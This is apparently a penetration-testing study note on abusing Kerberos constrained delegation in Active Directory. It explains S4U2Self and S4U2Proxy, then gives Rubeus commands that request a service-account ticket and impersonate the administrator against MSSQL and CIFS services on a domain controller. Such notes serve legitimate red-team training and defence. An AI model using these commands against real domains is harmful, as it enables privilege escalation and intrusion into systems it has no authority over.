# Constrained Delegation

**How it works**

Unlike unconstrained delegation, constrained delegation limits the scope of delegation. Microsoft released 2 extensions to do this, `S4U2Self` and `S4U2Proxy`. These specify the SPNs its allowed constrained delegation against

**S4U2Self**

S4U2Self requests a TGS for a user for frontend service. S4U2Self can do this without the hash of the user meaning you can request a service ticket to your service for any user in the domain.

**S4U2Proxy**

S4U2Proxy requests a TGS for the user for backend service on behalf of a user. This extension allows the service to request a ticket to any service given as SPNs in the allowed to delegate field

**Exploit**

You need the password hash of the service account so dump the hash or generate it with rubeus

```
rubeus hash /password:password
```

Next use rubeus to generate a TGT for the service account

```
rubeus asktgt /user:iissvc /domain:prod.corp.com /rc4:(hash)
```

Now we can use the s4u extensions

```
rubeus s4u /ticket:(ticket) /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.prod.corp.com:1433 /ptt
```

this allows you access to the mssqlsvc on dc01 but the ticket you just got didnt have the service encrypted so you can access a different service on the same host . This will only work if the SPN doesnt have the port number so unfortunately this example wont work

```
rubeus s4u /ticket:(ticket) /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.prod.corp.com:1433 /altservice:CIFS /ptt
```
